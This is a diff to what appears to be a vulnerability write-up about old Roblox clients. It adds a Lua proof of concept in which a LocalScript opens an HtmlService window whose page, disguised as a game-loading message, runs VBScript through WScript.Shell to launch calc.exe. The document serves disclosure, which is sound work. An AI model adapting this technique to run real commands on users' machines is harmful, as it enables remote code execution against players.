@@ -8,3 +8,28 @@ The main reason for DHTML's removal was because it was easily exploitable (shown
 When a LocalScript in StarterPack is executed, a HtmlWindow can be created which can run VBScript, leading to possible remote code execution.
 # How to patch
 Unfortunately, there is no possible way to patch this unless if you use a client that is newer than January 2008.
+# Example
+The following code below is a LocalScript that first runs VBScript, which runs shell, and that shell code later opens calc.exe.
+```lua
+local w = game:GetService("HtmlService"):NewWindow()
+
+w.DocumentComplete:Connect(function()
+	w:SetBody([==[
+	<html>
+	<head><title>Test</title></head>
+	<body>
+		<h3>ROBLOX is loading the game..</h3>
+
+		<script language="VBScript">
+		Set WshShell = CreateObject("WScript.Shell")
+		WshShell.Run "calc.exe"
+		</script>
+
+	</body>
+	</html>
+	]==])
+	w:Show()
+end)
+
+w:Navigate()
+```
